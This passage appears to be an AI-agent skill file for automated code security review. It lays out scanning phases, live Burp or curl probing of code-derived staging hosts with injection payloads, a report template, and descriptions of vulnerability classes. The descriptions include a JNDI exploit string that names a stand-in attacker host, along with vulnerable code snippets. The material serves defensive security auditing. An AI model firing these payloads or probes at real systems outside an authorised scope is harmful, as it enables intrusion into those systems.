   - Attack surface: routes, handlers, auth
   - User-input entry points
   - Framework-specific sinks (ORM, template engine, shell, file I/O)
3. Optionally read `graphify-out/GRAPH_REPORT.md` **only** if queries lack architecture context — do not read it by default
4. Record candidate files/symbols for Phase 1 — **do not** Read those files yet

### Phase 1: Static Pattern Detection

Scan **graphify-scoped files/symbols**. For **each** manifest section, **you** run the documented `rg` commands (Shell/Grep tool), then:

- Record pattern matched, file:line, snippet (Read ±5 lines)
- On hits: `graphify path` before filing FINDING
- Mark Appendix E row PASS / FINDING / N/A

Manifests: `sast_scan_manifest.md`, `frontend-stacktrace-leaks.md`, `secrets-patterns.md`, `injection-deep-scan.md`.

### Phase 1f: Extended Taxonomy Scans (mandatory)

After core manifests, cover **Partial** taxonomy rows applicable to the detected stack:

1. Read **`vulnerability-taxonomy-coverage.md`** — identify **Partial** / **Manual** rows for this repo.
2. Run applicable `rg` blocks from **`extended-category-scans.md`** (§1–§19; skip N/A e.g. §9 memory for Node-only).
3. Run **`extended-category-scans.md` §19** when Spring/Node/PHP/Python/Java/.NET detected.
4. On hits: `graphify path` → G1–G5 → VULN-NNN if TRUE POSITIVE.
5. Fill **Appendix H** (19 domain groups: TAX-INJ … TAX-FW) with PASS / FINDING / N/A.

**Note:** Appendix H attests full taxonomy coverage; **109 core Appendix E rows are unchanged**.

### Phase 1c: CVE Exploitability Analysis (mandatory)

1. Run `npm audit` (or read lockfile) **yourself** — interpret Critical/High advisories.
2. Follow **`references/cve-exploitability.md`** — run each section's `rg` / `graphify path` **yourself**.
3. For each CVE: confirm version → `rg` imports (`CVE-REACH-01`) → `graphify path` (`CVE-REACH-02`).
4. Report **CVE-NNN** only when your checklist verdict = **EXPLOITABLE**.
5. Update Appendix E rows `CVE-DEPS-*`, `CVE-REACH-*`, `CVE-CODE-*`.

### Phase 1d: IaC Misconfiguration Scan (mandatory)

1. Run `rg` per **`references/iac-misconfig-scan.md`** on `infra/`, `Dockerfile*`, `*.tf`, CI yaml.
2. AI-validate environment (staging vs prod) and compensating controls.
3. Report **IAC-NNN** for confirmed misconfigs; link **ARCH-07** blast radius.

### Phase 1e: Security Architect Review (mandatory)

1. Follow **`references/security-architect.md`** — **ARCH-01…07**.
2. Produce **Appendix G**: attack surface, trust boundaries, STRIDE, control gaps.
3. Prioritize manual review on high-risk surfaces identified here.
4. Cross-link structural risks to VULN/CVE/IAC/AUTH findings.

### Phase 1a: Unauthenticated Endpoint Audit (mandatory)

**Why:** SQLi/XSS scans miss routes with no auth that expose PII or state changes.

1. Follow **`references/route_auth_audit.md`** end-to-end.
2. Enumerate routes from Graphify recon or scoped `src/routes/**` reads.
3. Flag chains missing SSO/Basic/HMAC/API-key middleware; note bypass flags (`isSeller`, `login_not_required`, routes before `basicAuth`).
4. Assign provisional **AUTH-NNN** IDs; default **Medium / Not Verified**.

### Phase 1b: Burp MCP Verification (when MCP available)

**Prerequisite:** Discover hosts with `rg` per **`references/burp-host-discovery.md`** — record in Appendix C. **Do not** use `discover_burp_hosts.sh`.

1. If **no external host** in code → skip all Burp probes; document **Not Verified (no target host in code)**.
2. **Never** use `localhost`, `127.0.0.1`, `0.0.0.0`, or `::1` as `Host` header.
3. Check MCP for `user-burp` → `send_http1_request` (read tool schema first).
4. For each AUTH candidate, send request **without** auth to **code-derived staging host** (see `references/burp-host-discovery.md`).
5. Apply verdict matrix from `route_auth_audit.md`.
6. For XSS/CMD/XXE findings with HTTP surface: use payloads from `references/injection-deep-scan.md` on same host.
7. Record status + HTTP status in finding and **Appendix C/D**.

If Burp MCP is **not** configured, run **curl** probes per **`references/curl-dast-fallback.md`** (same hosts, same verdict matrix). Document `Verified in curl` in Appendix C (treat as **Verified in Burp** for AUTH severity). If neither Burp nor curl is run, document `Live verification: not run` and leave AUTH at **Medium / Not Verified**.

### Phase 2: Data Flow Analysis (Graphify-assisted)

For each potential vulnerability:

1. **Identify Source** — `graphify query` or prior recon; confirm with `graphify explain "<symbol>"`
2. **Trace Propagation** — **`graphify path "<source>" "<sink>"`** first; supplement with narrow `Read` only on nodes in the path
3. **Identify Sink** — from path output or `graphify affected "<source>" --depth 2`
4. **Document Each Step** — translate graph path nodes into the mandatory stack-trace format (file, line, method, code)

Sources to trace: HTTP params/headers/cookies/body, uploads, WebSocket, DB user data, env vars.

Sinks to trace: SQL/NoSQL, command exec, file ops, outbound HTTP (SSRF), template/HTML render, deserialize, JNDI.

**Token rule:** One `graphify path` per candidate beats reading 5–20 files manually.

### Phase 3: AI Validation

For EACH candidate finding, apply **`references/manual-code-review.md`** **Pre-Report Verification Gates (G1–G5)** first. If any gate fails → **FALSE POSITIVE** → Appendix A (note failed gate). Only then complete:

```markdown
## AI Validation Checklist

### 0. Pre-Report Gates (mandatory — see manual-code-review.md)
- [ ] **G1** Attacker-controlled input or missing auth on reachable route?
- [ ] **G2** Input reaches sink / handler realistically? (`graphify path` if taint)
- [ ] **G3** Existing protection documented; ineffective if claiming FINDING?
- [ ] **G4** Practically exploitable (not theoretical / dev-only / test-only)?
- [ ] **G5** Assumptions listed; minimal and realistic?

### 1. Source Verification
- [ ] Confirm input is user-controlled
- [ ] Identify exact entry point (file:line:method)
- [ ] Document input type (HTTP param, file, etc.)

### 2. Flow Verification  
- [ ] Trace complete path from source to sink
- [ ] Document all intermediate steps
- [ ] Identify any transformations

### 3. Sanitization Analysis
- [ ] Check for input validation
- [ ] Evaluate sanitization effectiveness
- [ ] Consider bypass techniques
- [ ] Check framework protections

### 4. Exploitability Assessment
- [ ] Is code path reachable?
- [ ] Are there auth guards?
- [ ] Can standard attacks succeed?
- [ ] What is real-world impact?

### VERDICT: TRUE_POSITIVE / FALSE_POSITIVE
### REASONING: [Detailed explanation — cite failed gate if FALSE POSITIVE]
```

### Phase 3b: Burp PoC Crafting (TRUE POSITIVES + AUTH findings)

For every validated TRUE POSITIVE **and** every AUTH finding:

1. **Identify HTTP surface** — method, path, content-type from routes/handlers (Graphify or route files).
2. **Map tainted parameter** — query, body JSON key, header, cookie, path segment (VULN); minimal valid params (AUTH).
3. **Build raw request** — follow format in **Burp Suite PoC** section above; use `references/burp_poc_templates.md`.
4. **Live verify AUTH** — if Burp MCP present, execute PoC via `send_http1_request` and set Status/Severity per rules.
5. **Document prerequisites** — auth flow, tokens, order IDs, multi-step chain.
6. **Define confirmation** — status code, body marker, timing, Collaborator callback.
7. **Safety label** — `read-only` vs `state-changing` vs `destructive`; prefer staging host.

If the finding is not reachable over HTTP (e.g., internal cron, pure code smell), set `Burp PoC: N/A` and explain manual/code exploit path instead.

### Phase 4: Generate Markdown Report

Write **`security_report.md`** (project root or `docs/security/security_report.md`) using the Report Structure below.

**Mandatory appendices:**
- **Appendix D** — every unauthenticated route (`AUTH-NNN`)
- **Appendix E** — **every check** from `references/report-coverage-matrix.md` (**109 rows**)
- **Appendix F** — phase execution log
- **Appendix G** — security architecture assessment (`security-architect.md`)
- **Appendix H** — vulnerability taxonomy attestation (`vulnerability-taxonomy-coverage.md`, 19 domain groups)

**Appendix E / F:** Copy the 109-row table from `report-coverage-matrix.md` and fill **every row yourself** as you complete checks. No `generate_coverage_appendix.py`. No `PENDING` at handoff.

Finding ID series: **VULN-NNN**, **AUTH-NNN**, **CVE-NNN**, **IAC-NNN**.

**Completion gate:** Appendix E counts match Executive Summary. Appendix F logs what **you** ran (`rg`, `graphify`, `npm audit`, Burp MCP, **curl**).

**Finding completeness gate (mandatory):** Follow **`references/report-finding-completeness.md`**. Count of `## [SEVERITY]` finding headers in Detailed Findings **must equal** count of `### Remediation` sections. Every code finding needs **BEFORE/AFTER** snippets under Remediation. Do not hand off if any finding lacks `### Remediation` — abbreviated table-only entries break HTML export.

If remediation changed source files: `graphify update .`

### Phase 5: Generate HTML Report (MANDATORY — formatting only)

After `security_report.md` is complete, **always** run `generate_html_report.py`. It does **not** scan code — it only styles the markdown you wrote. If the script errors, fix the script or report markdown and retry until `security_report.html` is produced.

```bash
python ~/.cursor/skills/ai-security-reviewer/scripts/generate_html_report.py security_report.md \
  -o security_report.html --project "[Project Name]"
```

Deliver **both** `security_report.md` and `security_report.html` at handoff.

---

## Report Structure

```markdown
# Security Assessment Report

**Report ID:** SEC-[YYYYMMDD]-[XXXX]
**Generated:** [DateTime]
**AI Model:** [Cursor Model Used]

---

## Executive Summary

### Scan Metrics
| Metric                      | Value |
|-----------------------------|-------|
| Files Analyzed              | X     |
| Lines of Code               | X     |
| **Total Security Checks**   | **109** |
| **Checks Executed**         | X     |
| **Checks Passed (PASS)**    | X     |
| **Checks with Findings**    | X     |
| **Checks N/A / Skipped**    | X     |
| Static Pattern Matches      | X     |
| AI-Validated True Positives | X     |
| Unauthenticated Endpoints   | X     |
| Burp-Verified (High)        | X     |
| Not Verified (Medium)         | X     |
| False Positives Filtered    | X     |
| Detection Accuracy          | X%    |
| **Coverage Rate (Appendix E)** | X% |

### Checks Performed Summary

| Layer | Checks | PASS | FINDING | N/A | SKIP | FAIL |
|-------|--------|------|---------|-----|------|------|
| SAST (OG) | 29 | X | X | X | X | X |
| SAST (LEAK) | 8 | X | X | X | X | X |
| SAST (SECRET) | 11 | X | X | X | X | X |
| SAST (INJ) | 5 | X | X | X | X | X |
| SAST (EXT) | 7 | X | X | X | X | X |
| CVE | 14 | X | X | X | X | X |
| IaC | 21 | X | X | X | X | X |
| ARCH | 7 | X | X | X | X | X |
| DAST | 3 | X | X | X | X | X |
| DEPS | 1 | X | X | X | X | X |
| GRAPH | 3 | X | X | X | X | X |
| **Total** | **109** | X | X | X | X | X |

### Risk Score: [X/100] - [CRITICAL/HIGH/MEDIUM/LOW]

### Severity Distribution
| Severity | Count | % |
|----------|-------|---|
| Critical | X     | X%|
| High     | X     | X%|
| Medium   | X     | X%|
| Low      | X     | X%|

### Top Vulnerability Categories
1. [Category] - X findings
2. [Category] - X findings
3. [Category] - X findings

---

## Findings Summary Table

| ID | Severity | Category | File:Line | Method | Burp PoC | Status |
|----|----------|----------|-----------|--------|----------|--------|
| VULN-001 | Critical | SQL Injection | UserController.java:150 | getUser() | Yes | True Positive |
| VULN-002 | High | XSS | index.js:2042 | renderAnswerChunkText() | Yes | True Positive |
| AUTH-001 | High | Missing Authentication | routes/api/index.js:520 | GET /order/details | Yes | Verified in Burp |
| CVE-001 | Critical | Exploitable CVE | package-lock.json | dependency | N/A | Exploitable |
| IAC-001 | High | IaC Misconfig | infra/nginx/staging.conf:42 | — | N/A | True Positive |

---

## Detailed Findings

[Each finding in complete format as specified above]

---

## Remediation Priority

### Immediate (Critical/High) - Fix within 24-48 hours
1. **VULN-001** - SQL Injection - Use PreparedStatement
2. **VULN-002** - XSS - Implement contextual output encoding

### Short-term (Medium) - Fix within 1-2 weeks
3. **VULN-003** - [Description]

### Long-term (Low) - Fix in next sprint
4. **VULN-004** - [Description]

---

## Appendix A: False Positives Filtered

<details>
<summary>X findings excluded by AI validation (click to expand)</summary>

| Pattern | Location | Exclusion Reason |
|---------|----------|------------------|
| SQL Injection | db.py:45 | Uses parameterized query |
| Hardcoded Secret | test_config.py:12 | Test file with placeholder value |
| XSS | template.html:89 | Framework auto-escapes by default |

</details>

---

## Appendix B: Scan Coverage

### Languages Analyzed
- Java: X files
- JavaScript: X files
- Python: X files

### Frameworks Detected
- Spring Boot
- React
- Flask

---

## Appendix C: Burp Suite Testing Notes

| Finding ID | Host | Endpoint | Auth sent | HTTP | Status | Intruder? |
|------------|------|----------|-----------|------|--------|-----------|
| VULN-001 | staging.example.com | GET /api/users | None | 200 | True Positive | Yes — `id` |
| AUTH-001 | staging.example.com | GET /order/details | None | 200 | Verified in Burp | No |
| AUTH-002 | staging.example.com | GET /refund/details | N/A | — | Not Verified | No |

---

## Appendix D: Unauthenticated Endpoint Inventory (MANDATORY)

| ID | Method | Path | Router file:line | Code auth | Burp status | Severity | Impact |
|----|--------|------|------------------|-----------|-------------|----------|--------|
| AUTH-001 | GET | /order/details | routes/api/index.js:520 | None | Verified in Burp | High | PII read |
| AUTH-002 | GET | /refund/details | routes/api/index.js:530 | None | Not Verified | Medium | PII read |

Include **every** route lacking application-layer auth. Burp status = `Verified in Burp` or `Not Verified` only.

---

## Appendix E: Security Check Coverage Matrix (MANDATORY)

> Full check list: `references/report-coverage-matrix.md` — **you** fill all 109 rows as you execute each check.

### Checks Performed Summary

| Metric | Value |
|--------|-------|
| Total checks defined | 109 |
| Checks executed (PASS + FINDING) | X |
| Findings (FINDING) | X |
| Not applicable (N/A) | X |
| Skipped (SKIP) | X |
| Failed to run (FAIL) | X |
| Coverage rate | X% |

| Check ID | Layer | Category | Tool | Status | Finding Ref | Match Count | Notes |
|----------|-------|----------|------|--------|-------------|-------------|-------|
| SAST-OG-01 | SAST | Active Debug Code | rg | PASS | — | 0 | |
| SAST-OG-02 | SAST | Code Injection | rg + graphify | PASS | — | 0 | |
| SAST-OG-03 | SAST | Command Injection | rg + graphify | PASS | — | 0 | |
| ... | ... | ... | ... | ... | ... | ... | *(all 109 rows — no PENDING at handoff)* |
| ARCH-07 | ARCH | IaC blast radius | architect | PASS | — | — | |

**Status legend:** `PASS` | `FINDING` | `FAIL` | `N/A` | `SKIP`

---

## Appendix F: Review Phase Execution Log (MANDATORY)

| Phase | Step | Command / Tool | Status | Artifact | Notes |
|-------|------|----------------|--------|----------|-------|
| −1 | Application context | manual-code-review.md | PASS | Appendix G | trust boundaries, assets |
| 0 | Burp host discovery | `rg` per burp-host-discovery.md | PASS | Appendix C | |
| 0 | Graphify graph | `graphify extract` / existing | PASS | graphify-out/graph.json | |
| 0 | Attack surface query | `graphify query` | PASS | — | budget 1500 |
| 1 | SAST manifests | `rg` per sast_scan_manifest + refs | PASS | Appendix E | |
| 1f | Extended taxonomy | extended-category-scans.md | PASS | Appendix H | |
| 1c | CVE reachability | `npm audit` + graphify path | PASS | CVE-NNN | |
| 1d | IaC `rg` scan | iac-misconfig-scan.md | PASS | IAC-NNN | |
| 1e | Architect review | security-architect.md | PASS | Appendix G | |
| 1a | Route auth audit | route_auth_audit.md | PASS | Appendix D | |
| 1b | Burp probes | `send_http1_request` | SKIP/PASS | Appendix C | |
| 2 | Data-flow traces | `graphify path` | PASS | — | |
| 3 | AI validation | agent checklist | PASS | Findings | |
| 4 | Markdown report | security_report.md | PASS | this file | |
| 5 | HTML export (optional) | generate_html_report.py | PASS | security_report.html | |

**Phase status:** `PASS` | `FAIL` | `SKIP` | `PARTIAL`

---

## Appendix G: Security Architecture Assessment (MANDATORY)

See `references/security-architect.md` for full template.

### Attack Surface Summary
| Surface | Entry points | Auth | Sensitivity |
|---------|--------------|------|-------------|

### Trust Boundaries
`Internet → WAF → Ingress → App → Redis/DB → Third-party`

### Top Structural Risks
1. [Risk] — Linked: VULN/CVE/IAC/AUTH-NNN

### Control Maturity (1–5)
| Domain | Score | Notes |
|--------|-------|-------|
| Authentication | | |
| Authorization | | |
| Supply chain / CVE | | |
| Infrastructure (IaC) | | |

### Researcher Notes
[KEV CVEs, attack chains, defense-in-depth]

---

## Appendix H: Vulnerability Taxonomy Attestation (MANDATORY)

> Full taxonomy: `references/vulnerability-taxonomy-coverage.md` — attest **19 domain groups** after Phase 1f.

| Group ID | Domain | Status | Finding Refs | Notes |
|----------|--------|--------|--------------|-------|
| TAX-INJ | Injection (SQL, NoSQL, CMD, LDAP, XPath, XML, CRLF, header, SSTI, EL, log) | PASS / FINDING / N/A | | |
| TAX-XSS | XSS / HTML / JS / DOM | | | |
| TAX-AUTH | Authentication (secrets, hashing, session gen, remember-me, bypass) | | | |
| TAX-AUTHZ | Authorization / IDOR / BOLA / mass assignment | | | |
| TAX-CRYPTO | Cryptographic weaknesses | | | |
| TAX-DATA | Sensitive data exposure | | | |
| TAX-FILE | Path / file handling | | | |
| TAX-DESER | Deserialization | | | |
| TAX-MEM | Memory (native C/C++) | N/A typical for web | | |
| TAX-API | API security | | | |
| TAX-SSRF | SSRF / open redirect | | | |
| TAX-XML | XML / XXE | | | |
| TAX-SESS | Session management | | | |
| TAX-CONFIG | Config / CORS / headers / debug | | | |
| TAX-LOGIC | Concurrency / business logic | Manual | | |
| TAX-MOBILE | Mobile | N/A unless mobile tree | | |
| TAX-IAC | Cloud / container / IaC | | | |
| TAX-DEPS | Supply chain / CVE | | | |
| TAX-FW | Framework-specific (Spring, Node, PHP, Python, Java, .NET) | | | |

**Completion gate:** Every applicable group has Status filled; N/A documented with reason (stack not present).

---

**Generated by AI Security Reviewer v4.3**
**HTML Export:** `python scripts/generate_html_report.py security_report.md -o security_report.html`
**PDF Export (optional):** `python generate_pdf.py security_report.md`
```

---

## Key Enhancements (v4.3)

| Feature | Description |
|---------|-------------|
| **Full vulnerability taxonomy** | `vulnerability-taxonomy-coverage.md` maps all issue classes (injection, XSS, auth, crypto, file, API, mobile, framework-specific) |
| **Extended category scans** | `extended-category-scans.md` — supplemental `rg` for Partial taxonomy rows (NoSQL, CRLF, SSTI, IDOR, upload, Spring/Node/PHP/Python/Java/.NET) |
| **Appendix H attestation** | 19 domain groups (TAX-INJ … TAX-FW) mandatory; complements unchanged 109-check Appendix E |
| **Injection manifest expanded** | `injection-deep-scan.md` adds NoSQL, CRLF, header, SSTI, EL, log injection sections |

## Key Enhancements (v4.2)

| Feature | Description |
|---------|-------------|
| **Mandatory ### Remediation** | `report-finding-completeness.md` — every finding; BEFORE/AFTER for code; gate before HTML |
| **curl DAST fallback** | `curl-dast-fallback.md` — live verify when Burp MCP unavailable; same verdict matrix |
| **HTML inference improved** | Generator pulls Remediation Priority + preamble heuristics as fallback only |

## Key Enhancements (v4.1)

| Feature | Description |
|---------|-------------|
| **Senior manual code review** | `manual-code-review.md` — context-first, taint analysis, OWASP/API taxonomy |
| **Pre-report gates G1–G5** | Mandatory before any FINDING; failures → Appendix A |
| **Phase −1** | Application context before broad scanning; feeds Appendix G |
| **High-confidence default** | Report only realistic exploitable issues; minimize false positives |

## Key Enhancements (v4.0)

| Feature | Description |
|---------|-------------|
| **Agent-only execution** | No scan scripts — you run `rg`, `graphify`, `npm audit`, Burp MCP per manifests |
| **Directions not pipelines** | Manifests are cookbooks; `references/agent-execution.md` defines the loop |
| **Reachability = AI + graphify** | Never report CVE/injection from pattern match alone — `graphify path` required |
| **Scripts deprecated for agents** | `scripts/` retained for optional CI only (`scripts/README.md`) |

## Key Enhancements (v3.9)

| Feature | Description |
|---------|-------------|
| **Exploitable CVE analysis** | CVE-NNN only when Critical/High + import + graphify reachability |
| **IaC misconfiguration scan** | IAC-NNN for Docker/K8s/Terraform/Nginx/CI — 21 checks |
| **Security architect lens** | ARCH-01…07 + Appendix G threat model, STRIDE, ASVS gaps |
| **109-check Appendix E** | All v3.8 checks retained + 42 new CVE/IaC/ARCH rows |
| `run_cve_iac_scan.sh` | CVE + IaC deterministic rg runner |

## Key Enhancements (v3.8)

| Feature | Description |
|---------|-------------|
| **Appendix E — Full check matrix** | All 67 SAST/DAST/GRAPH/DEPS checks with PASS/FINDING/N/A in every report |
| **Appendix F — Phase execution log** | Documents which workflow steps ran (graphify, SAST, Burp, HTML) |
| **Checks Performed Summary** | Executive summary + per-layer breakdown reconciled with Appendix E |
| **Coverage generator script** | `generate_coverage_appendix.py` pre-fills from `sast_scan_results.txt` |
| **Complete SAST runner** | `run_sast_scan.sh` now runs all LEAK-01…08, SECRET-01…11, EXT-01…07 |
| **DAST manifest** | `dast_scan_manifest.md` — Burp probe rules for AUTH and injection |

## Key Enhancements (v3.7)

| Feature | Description |
|---------|-------------|
| **Frontend stack trace leaks** | `frontend-stacktrace-leaks.md` — 8 leak categories to browser/API |
| **Full secrets catalog** | `secrets-patterns.md` — 11 sections (cloud, JWT, passwords, OAuth, env fallback) |
| **Deep injection scan** | XSS, RCE, command injection, XXE, XML in `injection-deep-scan.md` |
| **Code-derived Burp hosts** | `discover_burp_hosts.sh` — never localhost; skip if no host in code |

### v3.6

| Feature | Description |
|---------|-------------|
| **Unauthenticated Endpoint Audit** | Phase 1a — route inventory catches missing SSO/Basic/HMAC middleware |
| **Burp MCP Verification** | Phase 1b — `send_http1_request` without auth; High/Verified in Burp vs Medium/Not Verified |
| **AUTH-NNN Findings** | Dedicated finding format + Appendix D inventory table |
| **Burp Suite PoCs** | Raw HTTP requests per finding for Repeater/Intruder; prerequisites + expected indicators |
| **HTML Report Export** | Styled dark-theme HTML via `scripts/generate_html_report.py` — mandatory deliverable |
| **Graphify-First Discovery** | `query` / `path` / `explain` / `affected` with `--budget` before Read/Grep — cuts exploration tokens |
| **Natural Language Descriptions** | Checkmarx-style explanations describing what, where, how, and impact |
| **Full Stack Traces** | Complete source→sink data flow with every intermediate step |
| **Best Fix Location** | Identifies optimal point to fix (like Checkmarx BFL) |
| **Attack Vectors** | Real exploit examples for each vulnerability |
| **Impact Matrix** | CIA triad assessment with business impact |
| **Defense in Depth** | Multiple remediation approaches |
| **Before/After Code** | Complete code fixes with context |

---

---

## Additional Vulnerability Classes (from llm-sast-scanner)

### Stack Trace Leaking (CWE-209) - Information Disclosure

**Description Pattern:**
```
The method [METHOD] exposes internal stack trace information to users at line [LINE] 
of [FILE]. When an exception occurs, the full stack trace including file paths, 
class names, method signatures, and framework versions is returned in the HTTP 
response. This information disclosure enables attackers to map the internal 
architecture, identify framework versions with known CVEs, and craft targeted exploits.
```

**Detection Patterns:**
```python
# Python - VULNERABLE
return str(e)
return traceback.format_exc()
return {"error": repr(e), "trace": traceback.format_exc()}
app.run(debug=True)  # Flask debug mode
DEBUG = True         # Django debug mode
```

```javascript
// JavaScript - VULNERABLE
res.json({ error: err.stack });
res.json({ error: err.message });
res.json(err);  // Entire error object
```

```java
// Java - VULNERABLE
response.getWriter().println(e.getMessage());
e.printStackTrace(response.getWriter());
```

```php
// PHP - VULNERABLE
ini_set('display_errors', 1);
echo $e->getTraceAsString();
```

---

### Trust Boundary Violation (CWE-501)

**Description Pattern:**
```
The method [METHOD] stores untrusted HTTP request data directly into the server-side 
session at line [LINE] of [FILE]. The value from [SOURCE] is assigned to session 
attribute '[ATTR]' without validation. This allows attackers to manipulate session-bound 
data, potentially escalating privileges or bypassing access controls.
```

**Detection:**
```java
// VULNERABLE
session.setAttribute("role", request.getParameter("role"));
session.setAttribute("userId", request.getHeader("X-User-Id"));
```

---

### HTTP Request Smuggling (CWE-444)

**Description Pattern:**
```
The application architecture includes a frontend proxy ([PROXY]) forwarding to backend 
server ([BACKEND]) without proper Content-Length/Transfer-Encoding normalization. This 
configuration at [CONFIG_FILE] line [LINE] allows request smuggling attacks where 
attackers can bypass security controls, poison caches, or hijack other users' requests.
```

---

### JNDI Injection / Log4Shell (CWE-917)

**Description Pattern:**
```
The method [METHOD] passes user-controlled input to a JNDI lookup operation at line 
[LINE] of [FILE]. The input from [SOURCE] reaches InitialContext.lookup() / Log4j 
logging without sanitization. An attacker can inject JNDI URLs like 
'ldap://attacker.com/Exploit' to load malicious classes, resulting in Remote Code 
Execution on the server.
```

**Detection:**
```java
// Direct JNDI - VULNERABLE
ctx.lookup(request.getParameter("ds"));

// Log4Shell - VULNERABLE (Log4j < 2.17.0)
logger.info("User-Agent: {}", request.getHeader("User-Agent"));
```

---

### Session Fixation (CWE-384)

**Description Pattern:**
```
The method [METHOD] authenticates users without regenerating the session ID at line 
[LINE] of [FILE]. After successful authentication, the pre-authentication session ID 
remains valid, allowing attackers who know or set this ID to hijack the authenticated 
session and gain full access to the victim's account.
```

**Detection:**
```java
// VULNERABLE - No session.invalidate() or changeSessionId()
session.setAttribute("user", authenticatedUser);
```

---

### Denial of Service Patterns

#### ReDoS (CWE-1333)
```
The method [METHOD] applies a regular expression with catastrophic backtracking 
potential to user-controlled input at line [LINE] of [FILE]. The regex pattern 
'[PATTERN]' contains [nested quantifiers/overlapping alternation] that causes 
exponential time complexity. An attacker can supply crafted input to freeze the 
server thread for extended periods.
```

#### XML Bomb (CWE-776)
```
The method [METHOD] parses XML from untrusted sources without disabling entity 
expansion at line [LINE] of [FILE]. An attacker can send a "Billion Laughs" payload 
that expands recursively, consuming all available memory and causing denial of service.
```

#### Zip Bomb (CWE-409)
```
The method [METHOD] extracts compressed archives without validating the uncompressed 
size at line [LINE] of [FILE]. An attacker can upload a small zip file (e.g., 42KB) 
that expands to petabytes of data, exhausting disk space and memory.
```

---

## Extended References

| File | Contents |
|------|----------|
| **`references/report-finding-completeness.md`** | **Mandatory ### Remediation** per finding; BEFORE/AFTER; pre-HTML gate |
| **`references/skill-privacy.md`** | **No user/org data in skill** — hygiene checklist before sharing |
| **`references/curl-dast-fallback.md`** | **curl live verify** when Burp MCP unavailable |
| **`references/manual-code-review.md`** | **Senior AppSec manual review** — context, taint, OWASP taxonomy, gates G1–G5 |
| **`references/agent-execution.md`** | **Agent-only rules** — no scan scripts; per-check loop |
| `references/frontend-stacktrace-leaks.md` | SAST-LEAK-01…08 — stacks/errors to frontend |
| `references/secrets-patterns.md` | SAST-SECRET-01…11 — keys/passwords/tokens |
| **`references/vulnerability-taxonomy-coverage.md`** | **Master taxonomy map** — all issue classes → check IDs + coverage level |
| **`references/extended-category-scans.md`** | **Supplemental `rg` probes** for Partial taxonomy rows + framework stacks |
| `references/injection-deep-scan.md` | XSS, RCE, CMD, XXE, XML, NoSQL, CRLF, SSTI, EL, log injection |
| `references/burp-host-discovery.md` | Code-derived Burp targets — **agent runs `rg`** (no script) |
| `references/opengrep-vulnerability-index.md` | OpenGrep class → `SAST-OG-*` mapping |
| `references/sast_scan_manifest.md` | SAST checks — **agent runs each `rg` block** |
| `references/cve-exploitability.md` | CVE-DEPS/REACH/CODE + reachability proof |
| `references/iac-misconfig-scan.md` | IAC-* — **agent runs each `rg` block** |
| `references/security-architect.md` | ARCH-* + Appendix G |
| `references/dast_scan_manifest.md` | Burp MCP DAST probes |
| `references/route_auth_audit.md` | Unauthenticated endpoints, Appendix D |
| `references/patterns.md` | Regex signatures (graphify-scoped) |
| `references/burp_poc_templates.md` | Burp Repeater templates |
| `references/additional_vulns.md` | JNDI, session fixation, DoS, etc. |
| `references/graphify_security.md` | Graphify query templates |
| `references/report-coverage-matrix.md` | **Appendix E** — full **109-check** inventory |
| `references/coverage-checklist.md` | Appendix E summary + completion gate |
| `scripts/README.md` | Scan scripts = optional CI only, not for agents |
| `scripts/generate_html_report.py` | Optional markdown → HTML **formatting** only |

---

## Usage

```
# Standard review (Graphify-first + route auth audit)
Review this code for security vulnerabilities

# Build graph first if missing
/graphify .
# then review

# Full audit with unauthenticated endpoint check + Burp verification + HTML
Run comprehensive security audit, check unauthenticated endpoints, verify with Burp MCP if available, generate security_report.html

# With specific focus
Check for SQL injection and XSS in the API controllers

# Check for stack trace leaking
Check for information disclosure and stack trace exposure

# Full audit with PDF (optional)
Run comprehensive security audit and generate PDF report
```

**Direct execution only:** Run this entire workflow yourself. Do **not** delegate to subagents.

---

## HTML Report (MANDATORY — formatting only)

After **you** complete `security_report.md`, run `generate_html_report.py` and deliver `security_report.html` alongside the markdown. It does not perform security analysis.

---

## PDF Generation (optional)

After review, generate PDF:

```bash
python generate_pdf.py security_report.md output.pdf "Project Name"
```

Or ask: "Generate PDF report"
